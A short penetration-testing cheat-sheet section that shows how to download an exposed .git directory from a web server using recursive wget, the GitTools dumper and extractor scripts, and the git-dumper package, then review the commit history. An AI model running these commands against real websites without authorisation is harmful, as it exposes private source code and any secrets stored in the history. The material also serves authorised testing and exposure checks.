## Dumping

We can simply use **`wget`** command in Linux to download the git repository.  
After that, we can investigate files or all histories.

```bash
# -r: Recursive
wget -r https://example.com/.git/
cd example.com
git log --stat
git checkout <commit_id>
```

<br />

## Dumping with gitdumper and extracter

[GitTools](https://github.com/internetwache/GitTools) downloads Git repository of the web application.  
To dump the repository, execute the following commands.

```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
chmod +x gitdumper.sh
./gitdumper.sh https://example.com/.git/ ./example
```

We should get the git repository in local.  
Then extract the entire project by executing the following.

```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh
chmod +x extractor.sh
./extractor.sh ./example ./new_example
```

Now we retrieve the entire git project from website.  
It is stored in **“./new_example”** folder. We can investigate the repository.

## Dumping with Git-Dumper

[git-dumper](https://github.com/arthaud/git-dumper) is an useful Python package.

```bash
pip install git-dumper
git-dumper https://example.com/.git ./dumped
```
